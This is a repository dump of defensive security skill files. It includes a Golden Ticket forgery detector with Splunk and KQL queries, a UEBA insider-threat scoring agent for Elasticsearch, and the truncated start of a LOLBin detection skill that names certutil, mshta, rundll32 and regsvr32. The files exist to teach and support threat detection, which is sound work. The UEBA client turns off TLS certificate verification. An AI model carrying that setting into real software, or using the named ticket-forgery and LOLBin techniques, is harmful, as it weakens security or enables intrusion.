      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/detecting-golden-ticket-forgery/references/api-reference.md =====
# Golden Ticket Forgery Detection API Reference

## Windows Security Event IDs

### Event ID 4768 - TGT Requested (AS-REQ)
```
Key Fields:
  TargetUserName        - Account requesting TGT
  TargetDomainName      - Domain of requesting account
  IpAddress             - Source IP
  TicketEncryptionType  - 0x12 (AES256), 0x11 (AES128), 0x17 (RC4)
  PreAuthType           - 15 = PA-ENC-TIMESTAMP (normal)
```

### Event ID 4769 - TGS Requested (TGS-REQ)
```
Key Fields:
  TargetUserName        - Account using the ticket
  ServiceName           - SPN of target service
  IpAddress             - Source IP of requestor
  TicketEncryptionType  - 0x17 = RC4 (Golden Ticket indicator)
  TicketOptions         - Kerberos ticket flags
  LogonGuid             - Correlate with Event 4624
```

## Detection Indicators

| Indicator | Normal | Golden Ticket |
|---|---|---|
| TicketEncryptionType | 0x12 (AES256) | 0x17 (RC4-HMAC) |
| TGT Lifetime | <= 10 hours | Often 10+ years |
| TGS without TGT | Always preceded by 4768 | 4769 without 4768 |
| Domain field | Matches domain | May be blank or incorrect |

## Splunk SPL Queries

### RC4 TGS Detection (Golden Ticket)
```spl
index=wineventlog sourcetype="WinEventLog:Security" EventCode=4769
  TicketEncryptionType=0x17
  ServiceName!="krbtgt"
| stats count by TargetUserName, IpAddress, ServiceName
| where count > 3
| sort -count
```

### Orphaned TGS (No Prior TGT)
```spl
index=wineventlog EventCode=4769
| join type=left TargetUserName
  [search index=wineventlog EventCode=4768
   | dedup TargetUserName | fields TargetUserName]
| where isnull(TargetUserName)
| stats count by TargetUserName, IpAddress
```

### krbtgt Service Anomaly
```spl
index=wineventlog EventCode=4769 ServiceName="krbtgt*"
| table _time, TargetUserName, IpAddress, TicketEncryptionType
```

## Elastic KQL

### RC4 Downgrade in Elastic
```kql
event.code: "4769" AND winlog.event_data.TicketEncryptionType: "0x17"
  AND NOT winlog.event_data.ServiceName: "krbtgt"
```

## MITRE ATT&CK

| Technique | ID | Description |
|---|---|---|
| Steal or Forge Kerberos Tickets: Golden Ticket | T1558.001 | Forge TGT using krbtgt hash |

## CLI Usage
```bash
python agent.py --evtx-xml security_events.xml --output golden_ticket_report.json
python agent.py --show-splunk
python agent.py --evtx-xml events.xml --max-ticket-hours 8
```

===== END FILE =====


===== FILE: skills/detecting-golden-ticket-forgery/scripts/agent.py =====
#!/usr/bin/env python3
"""Detect Kerberos Golden Ticket forgery via Windows Security event log analysis."""

import json
import argparse
import xml.etree.ElementTree as ET
from collections import defaultdict
from datetime import datetime


def parse_security_events(xml_path):
    """Parse exported Windows Security event log XML for Kerberos events 4768/4769."""
    tree = ET.parse(xml_path)
    root = tree.getroot()
    ns = {"e": "http://schemas.microsoft.com/win/2004/08/events/event"}
    events = []
    for event_el in root.findall(".//e:Event", ns):
        sys_el = event_el.find("e:System", ns)
        event_id = int(sys_el.find("e:EventID", ns).text)
        if event_id not in (4768, 4769):
            continue
        time_created = sys_el.find("e:TimeCreated", ns).attrib.get("SystemTime", "")
        data_el = event_el.find("e:EventData", ns)
        fields = {}
        for d in data_el.findall("e:Data", ns):
            fields[d.attrib.get("Name", "")] = d.text or ""
        events.append({"event_id": event_id, "timestamp": time_created, **fields})
    return events


def detect_rc4_in_aes_environment(events):
    """Detect RC4 encryption (0x17) in TGS requests where AES should be enforced."""
    alerts = []
    for ev in events:
        if ev["event_id"] != 4769:
            continue
        enc_type = ev.get("TicketEncryptionType", "")
        if enc_type in ("0x17", "23"):
            alerts.append({
                "detection": "RC4 Encryption in TGS Request",
                "mitre_technique": "T1558.001",
                "timestamp": ev["timestamp"],
                "user": ev.get("TargetUserName", ""),
                "domain": ev.get("TargetDomainName", ""),
                "service": ev.get("ServiceName", ""),
                "ip_address": ev.get("IpAddress", ""),
                "encryption_type": enc_type,
                "severity": "critical",
                "description": "RC4 (0x17) encryption detected in TGS request; Golden Ticket indicator in AES-enforced environments",
            })
    return alerts


def detect_orphaned_tgs(events):
    """Detect TGS requests (4769) without preceding TGT request (4768) from same user."""
    tgt_users = set()
    for ev in events:
        if ev["event_id"] == 4768:
            tgt_users.add(f"{ev.get('TargetUserName', '')}@{ev.get('TargetDomainName', '')}")
    alerts = []
    tgs_without_tgt = defaultdict(list)
    for ev in events:
        if ev["event_id"] != 4769:
            continue
        user_key = f"{ev.get('TargetUserName', '')}@{ev.get('TargetDomainName', '')}"
        if user_key not in tgt_users and ev.get("TargetUserName", ""):
            tgs_without_tgt[user_key].append(ev)
    for user, tgs_events in tgs_without_tgt.items():
        alerts.append({
            "detection": "Orphaned TGS Request (No Preceding TGT)",
            "mitre_technique": "T1558.001",
            "user": user,
            "tgs_count": len(tgs_events),
            "services": list({e.get("ServiceName", "") for e in tgs_events}),
            "source_ips": list({e.get("IpAddress", "") for e in tgs_events}),
            "first_seen": tgs_events[0]["timestamp"],
            "severity": "critical",
            "description": "TGS requests without corresponding TGT; forged ticket likely",
        })
    return alerts


def detect_abnormal_ticket_lifetime(events, max_lifetime_hours=10):
    """Detect tickets with lifetime exceeding domain policy (default MaxTicketAge=10h)."""
    user_tgt_times = defaultdict(list)
    for ev in events:
        if ev["event_id"] == 4768 and ev.get("TargetUserName"):
            try:
                ts = datetime.fromisoformat(ev["timestamp"].replace("Z", "+00:00"))
                user_tgt_times[ev["TargetUserName"]].append(ts)
            except (ValueError, AttributeError):
                continue
    alerts = []
    for user, times in user_tgt_times.items():
        if len(times) < 2:
            continue
        times.sort()
        for i in range(1, len(times)):
            gap_hours = (times[i] - times[i - 1]).total_seconds() / 3600
            if gap_hours > max_lifetime_hours * 2:
                alerts.append({
                    "detection": "Abnormal TGT Renewal Gap",
                    "mitre_technique": "T1558.001",
                    "user": user,
                    "gap_hours": round(gap_hours, 2),
                    "max_expected_hours": max_lifetime_hours,
                    "severity": "high",
                    "description": f"TGT renewal gap of {gap_hours:.1f}h exceeds 2x MaxTicketAge ({max_lifetime_hours}h)",
                })
    return alerts


def detect_krbtgt_service_anomaly(events):
    """Detect TGS requests targeting the krbtgt service (unusual and suspicious)."""
    alerts = []
    for ev in events:
        if ev["event_id"] == 4769 and ev.get("ServiceName", "").lower().startswith("krbtgt"):
            alerts.append({
                "detection": "TGS Request Targeting krbtgt Service",
                "mitre_technique": "T1558.001",
                "timestamp": ev["timestamp"],
                "user": ev.get("TargetUserName", ""),
                "service": ev.get("ServiceName", ""),
                "ip_address": ev.get("IpAddress", ""),
                "severity": "critical",
                "description": "Direct TGS request for krbtgt service is highly anomalous",
            })
    return alerts


def generate_splunk_queries():
    """Return Splunk SPL queries for Golden Ticket detection."""
    return {
        "rc4_downgrade": (
            'index=wineventlog sourcetype="WinEventLog:Security" EventCode=4769 '
            'TicketEncryptionType=0x17 ServiceName!="krbtgt" '
            '| stats count by TargetUserName, IpAddress, ServiceName'
        ),
        "orphaned_tgs": (
            'index=wineventlog EventCode=4769 '
            '| join type=left TargetUserName [search index=wineventlog EventCode=4768 '
            '| rename TargetUserName as tgt_user | dedup tgt_user | fields tgt_user] '
            '| where isnull(tgt_user) | stats count by TargetUserName, IpAddress'
        ),
        "krbtgt_tgs": (
            'index=wineventlog EventCode=4769 ServiceName="krbtgt*" '
            '| table _time, TargetUserName, IpAddress, ServiceName, TicketEncryptionType'
        ),
    }


def main():
    parser = argparse.ArgumentParser(description="Golden Ticket Forgery Detector")
    parser.add_argument("--evtx-xml", help="Path to exported Security event log XML")
    parser.add_argument("--max-ticket-hours", type=int, default=10, help="MaxTicketAge in hours (default: 10)")
    parser.add_argument("--output", default="golden_ticket_report.json", help="Output report path")
    parser.add_argument("--show-splunk", action="store_true", help="Print Splunk SPL queries")
    args = parser.parse_args()

    if args.show_splunk:
        for name, spl in generate_splunk_queries().items():
            print(f"\n--- {name} ---\n{spl}")
        return

    if not args.evtx_xml:
        print("[!] Provide --evtx-xml path or use --show-splunk for detection queries")
        return

    events = parse_security_events(args.evtx_xml)
    print(f"[+] Parsed {len(events)} Kerberos events (4768/4769)")

    rc4_alerts = detect_rc4_in_aes_environment(events)
    orphan_alerts = detect_orphaned_tgs(events)
    lifetime_alerts = detect_abnormal_ticket_lifetime(events, args.max_ticket_hours)
    krbtgt_alerts = detect_krbtgt_service_anomaly(events)

    report = {
        "analysis_time": datetime.utcnow().isoformat() + "Z",
        "total_events": len(events),
        "detections": {
            "rc4_encryption_downgrade": rc4_alerts,
            "orphaned_tgs_requests": orphan_alerts,
            "abnormal_ticket_lifetime": lifetime_alerts,
            "krbtgt_service_anomaly": krbtgt_alerts,
        },
        "total_alerts": len(rc4_alerts) + len(orphan_alerts) + len(lifetime_alerts) + len(krbtgt_alerts),
        "mitre_techniques": ["T1558.001"],
        "splunk_queries": generate_splunk_queries(),
    }

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    print(f"[+] RC4 downgrades: {len(rc4_alerts)}")
    print(f"[+] Orphaned TGS: {len(orphan_alerts)}")
    print(f"[+] Lifetime anomalies: {len(lifetime_alerts)}")
    print(f"[+] krbtgt anomalies: {len(krbtgt_alerts)}")
    print(f"[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/detecting-insider-threat-with-ueba/SKILL.md =====
---
name: detecting-insider-threat-with-ueba
description: Implement User and Entity Behavior Analytics (UEBA) using Elasticsearch/OpenSearch
  to build behavioral baselines, calculate anomaly scores, perform peer group analysis,
  and alert on insider threat indicators such as data exfiltration, privilege abuse, and
  unauthorized access. Use when building or tuning a UEBA pipeline rather than a one-off
  manual hunt.
domain: cybersecurity
subdomain: threat-detection
tags:
- ueba
- insider-threat
- anomaly-detection
- elasticsearch
- behavior-analytics
- machine-learning
- siem
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- DE.CM-01
- DE.AE-02
- DE.AE-06
- ID.RA-05
mitre_attack:
- T1078
- T1190
- T1059
- T1048
- T1041
---

# Detecting Insider Threat with UEBA

## Overview

User and Entity Behavior Analytics (UEBA) moves beyond static rule-based detection to model normal behavior for users, hosts, and applications, then flag statistically significant deviations that may indicate insider threats. Using Elasticsearch as the analytics backend, this skill covers building behavioral baselines from authentication logs, file access events, and network activity, computing risk scores using statistical deviation and peer group comparison, and correlating multiple low-confidence indicators into high-confidence insider threat alerts.


## When to Use

- When investigating security incidents that require detecting insider threat with ueba
- When building detection rules or threat hunting queries for this domain
- When SOC analysts need structured procedures for this analysis type
- When validating security monitoring coverage for related attack techniques

## Prerequisites

- Elasticsearch 8.x or OpenSearch 2.x cluster with security audit data
- Log sources: Active Directory authentication, VPN, DLP, file server access, email
- Python 3.9+ with elasticsearch client library
- Baseline period of 30+ days of normal user activity data
- Defined peer groups based on department, role, or job function

## Steps

### Step 1: Ingest and Normalize Activity Logs
Configure log pipelines to ingest authentication, file access, email, and network logs into Elasticsearch with a unified user identity field.

### Step 2: Build Behavioral Baselines
Calculate per-user baselines for login times, data volume, application usage, and access patterns over a rolling 30-day window using Elasticsearch aggregations.

### Step 3: Calculate Anomaly Scores
Compare current activity against baselines using z-score deviation and peer group comparison to generate per-user risk scores.

### Step 4: Correlate and Alert
Combine multiple anomalous indicators (unusual hours + large downloads + new system access) into composite risk scores that trigger SOC investigation workflows.

## Expected Output

JSON report containing per-user risk scores, anomalous activity details, peer group deviations, and recommended investigation actions.

===== END FILE =====


===== FILE: skills/detecting-insider-threat-with-ueba/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/detecting-insider-threat-with-ueba/references/api-reference.md =====
# API Reference: Detecting Insider Threat with UEBA

## Elasticsearch Aggregation Queries

### Per-User Daily Activity Baseline
```json
{
  "aggs": {
    "users": {
      "terms": {"field": "user.name", "size": 5000},
      "aggs": {
        "daily_events": {"date_histogram": {"field": "@timestamp", "calendar_interval": "day"}},
        "unique_hosts": {"cardinality": {"field": "host.name"}},
        "data_volume": {"sum": {"field": "bytes_transferred"}}
      }
    }
  }
}
```

### Anomaly Detection (Z-Score > 3)
```python
from elasticsearch import Elasticsearch
es = Elasticsearch(["https://localhost:9200"], api_key="base64key")
result = es.search(index="logs-*", body=query)
z_score = (current - baseline_avg) / baseline_std
```

## Insider Threat Indicators

| Indicator | Detection Method | Severity |
|-----------|-----------------|----------|
| Activity spike | Z-score > 3 standard deviations | High |
| Data exfiltration | Volume > 5x daily average | Critical |
| New host access | Unique hosts > 2x baseline | High |
| Off-hours activity | Login outside 06:00-22:00 | Medium |
| Peer group outlier | Activity > 3x peer average | Medium |
| Privilege escalation | New admin role assignment | Critical |
| Resignation + download | HR flag + high data volume | Critical |

## Elasticsearch Python Client

```bash
pip install elasticsearch>=8.0
```

| Method | Description |
|--------|-------------|
| `es.search(index, body)` | Execute aggregation query |
| `es.indices.get_alias("logs-*")` | List matching indices |
| `es.count(index)` | Get document count |

## Risk Scoring Model

| Score Range | Risk Level | Action |
|-------------|------------|--------|
| 0 - 30 | Low | No action |
| 31 - 60 | Medium | Monitor |
| 61 - 80 | High | SOC investigation |
| 81 - 100 | Critical | Immediate response |

## MITRE ATT&CK Insider Techniques

| Technique | ID | UEBA Detection |
|-----------|----|----------------|
| Data from Local System | T1005 | Volume anomaly on file servers |
| Exfiltration Over Web Service | T1567 | Cloud upload volume spike |
| Account Manipulation | T1098 | Unusual privilege changes |
| Valid Accounts | T1078 | Off-hours or location anomaly |

### References

- Elasticsearch Python Client: https://elasticsearch-py.readthedocs.io/
- MITRE Insider Threat: https://attack.mitre.org/techniques/T1078/
- NIST SP 800-53 AC-2: https://csf.tools/reference/nist-sp-800-53/r5/ac/ac-2/

===== END FILE =====


===== FILE: skills/detecting-insider-threat-with-ueba/scripts/agent.py =====
#!/usr/bin/env python3
"""UEBA Insider Threat Agent - builds behavioral baselines and scores anomalies using Elasticsearch."""

import json
import argparse
import logging
import math
import os
from collections import defaultdict
from datetime import datetime, timedelta
from elasticsearch import Elasticsearch

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)


def connect_es(hosts, api_key=None):
    """Connect to Elasticsearch cluster."""
    kwargs = {"hosts": hosts, "verify_certs": False, "request_timeout": 30}
    if api_key:
        kwargs["api_key"] = api_key
    return Elasticsearch(**kwargs)


def build_user_baseline(es, index, user_field, hours=720):
    """Build 30-day behavioral baseline per user using ES aggregations."""
    since = (datetime.utcnow() - timedelta(hours=hours)).isoformat()
    query = {
        "size": 0,
        "query": {"range": {"@timestamp": {"gte": since}}},
        "aggs": {
            "users": {
                "terms": {"field": user_field, "size": 5000},
                "aggs": {
                    "login_hours": {"histogram": {"field": "hour_of_day", "interval": 1}},
                    "daily_events": {"date_histogram": {"field": "@timestamp", "calendar_interval": "day"}},
                    "unique_hosts": {"cardinality": {"field": "host.name"}},
                    "data_volume": {"sum": {"field": "bytes_transferred"}},
                    "unique_apps": {"cardinality": {"field": "application.name"}},
                }
            }
        }
    }
    result = es.search(index=index, body=query)
    baselines = {}
    for bucket in result["aggregations"]["users"]["buckets"]:
        user = bucket["key"]
        daily_counts = [d["doc_count"] for d in bucket["daily_events"]["buckets"]]
        avg_daily = sum(daily_counts) / max(len(daily_counts), 1)
        std_daily = math.sqrt(sum((x - avg_daily) ** 2 for x in daily_counts) / max(len(daily_counts), 1))
        baselines[user] = {
            "avg_daily_events": round(avg_daily, 1),
            "std_daily_events": round(std_daily, 1),
            "unique_hosts": bucket["unique_hosts"]["value"],
            "total_data_volume": bucket["data_volume"]["value"],
            "total_events": bucket["doc_count"],
        }
    return baselines


def score_current_activity(es, index, user_field, baselines, hours=24):
    """Score current activity against baselines to find anomalies."""
    since = (datetime.utcnow() - timedelta(hours=hours)).isoformat()
    query = {
        "size": 0,
        "query": {"range": {"@timestamp": {"gte": since}}},
        "aggs": {
            "users": {
                "terms": {"field": user_field, "size": 5000},
                "aggs": {
                    "unique_hosts": {"cardinality": {"field": "host.name"}},
                    "data_volume": {"sum": {"field": "bytes_transferred"}},
                    "unique_apps": {"cardinality": {"field": "application.name"}},
                }
            }
        }
    }
    result = es.search(index=index, body=query)
    anomalies = []
    for bucket in result["aggregations"]["users"]["buckets"]:
        user = bucket["key"]
        baseline = baselines.get(user)
        if not baseline:
            anomalies.append({
                "user": user, "indicator": "new_user",
                "severity": "medium", "detail": "No baseline exists for this user",
                "risk_score": 50,
            })
            continue
        current_events = bucket["doc_count"]
        avg = baseline["avg_daily_events"]
        std = baseline["std_daily_events"]
        z_score = (current_events - avg) / max(std, 1)
        if z_score > 3:
            anomalies.append({
                "user": user, "indicator": "activity_spike",
                "severity": "high", "z_score": round(z_score, 2),
                "current": current_events, "baseline_avg": avg,
                "risk_score": min(int(z_score * 15), 100),
                "detail": f"Event count {current_events} is {z_score:.1f} std devs above baseline",
            })
        current_hosts = bucket["unique_hosts"]["value"]
        if current_hosts > baseline["unique_hosts"] * 2:
            anomalies.append({
                "user": user, "indicator": "new_host_access",
                "severity": "high",
                "current_hosts": current_hosts,
                "baseline_hosts": baseline["unique_hosts"],
                "risk_score": 70,
                "detail": f"Accessed {current_hosts} hosts vs baseline {baseline['unique_hosts']}",
            })
        current_volume = bucket["data_volume"]["value"]
        daily_avg_volume = baseline["total_data_volume"] / 30
        if current_volume > daily_avg_volume * 5 and current_volume > 100_000_000:
            anomalies.append({
                "user": user, "indicator": "data_exfiltration",
                "severity": "critical",
                "current_bytes": current_volume,
                "baseline_daily_avg": round(daily_avg_volume),
                "risk_score": 90,
                "detail": f"Transferred {current_volume / 1e6:.0f}MB vs daily avg {daily_avg_volume / 1e6:.1f}MB",
            })
    return sorted(anomalies, key=lambda x: x.get("risk_score", 0), reverse=True)


def peer_group_analysis(baselines, peer_groups):
    """Compare user activity against peer group averages."""
    findings = []
    group_stats = defaultdict(list)
    for user, baseline in baselines.items():
        group = peer_groups.get(user, "default")
        group_stats[group].append(baseline["avg_daily_events"])
    group_avgs = {g: sum(v) / len(v) for g, v in group_stats.items()}
    for user, baseline in baselines.items():
        group = peer_groups.get(user, "default")
        group_avg = group_avgs.get(group, 0)
        if group_avg > 0 and baseline["avg_daily_events"] > group_avg * 3:
            findings.append({
                "user": user, "peer_group": group,
                "user_avg": baseline["avg_daily_events"],
                "group_avg": round(group_avg, 1),
                "deviation_factor": round(baseline["avg_daily_events"] / group_avg, 1),
                "severity": "medium",
            })
    return findings


def generate_report(anomalies, peer_findings, baselines):
    critical = sum(1 for a in anomalies if a.get("severity") == "critical")
    return {
        "timestamp": datetime.utcnow().isoformat(),
        "users_baselined": len(baselines),
        "anomalies_detected": len(anomalies),
        "critical_anomalies": critical,
        "top_risk_users": anomalies[:15],
        "peer_group_outliers": peer_findings[:10],
        "risk_level": "critical" if critical > 0 else "high" if anomalies else "low",
    }


def main():
    parser = argparse.ArgumentParser(description="UEBA Insider Threat Detection Agent")
    parser.add_argument("--es-hosts", default=os.environ.get("ES_HOSTS", "https://localhost:9200"), help="Elasticsearch hosts")
    parser.add_argument("--api-key", help="Elasticsearch API key")
    parser.add_argument("--index", default="logs-*", help="Log index pattern")
    parser.add_argument("--user-field", default="user.name", help="User identity field")
    parser.add_argument("--peer-groups", help="JSON file mapping users to peer groups")
    parser.add_argument("--lookback", type=int, default=24, help="Anomaly lookback hours")
    parser.add_argument("--output", default="ueba_insider_threat_report.json")
    args = parser.parse_args()

    es = connect_es(args.es_hosts.split(","), args.api_key)
    baselines = build_user_baseline(es, args.index, args.user_field)
    anomalies = score_current_activity(es, args.index, args.user_field, baselines, args.lookback)
    peer_groups = {}
    if args.peer_groups:
        with open(args.peer_groups) as f:
            peer_groups = json.load(f)
    peer_findings = peer_group_analysis(baselines, peer_groups)
    report = generate_report(anomalies, peer_findings, baselines)
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2, default=str)
    logger.info("UEBA: %d users baselined, %d anomalies (%d critical)",
                len(baselines), len(anomalies), report["critical_anomalies"])
    print(json.dumps(report, indent=2, default=str))


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/detecting-living-off-the-land-attacks/SKILL.md =====
---
name: detecting-living-off-the-land-attacks
description: 'Detect abuse of legitimate Windows binaries (LOLBins) used for living
  off the land attacks. Monitors process creation, command-line arguments, and parent-child
  relationships to identify suspicious LOLBin execution patterns.

  '
domain: cybersecurity
subdomain: threat-detection
tags:
- lolbins
- lotl
- fileless-attacks
- process-monitoring
version: '1.0'
author: mahipal
license: Apache-2.0
d3fend_techniques:
- Application Protocol Command Analysis
- Network Isolation
- Network Traffic Analysis
- Client-server Payload Profiling
- Network Traffic Community Deviation
nist_csf:
- DE.CM-01
- DE.AE-02
- DE.AE-06
- ID.RA-05
mitre_attack:
- T1078
- T1190
- T1059
---

# Detecting Living Off the Land Attacks

Monitor for suspicious use of legitimate Windows binaries (LOLBins)
including certutil, mshta, rundll32, regsvr32, and others used in
fileless and living-off-the-land attack techniques.

## When to Use

- Building detection rules for SIEM or EDR platforms to catch LOLBin abuse in real time
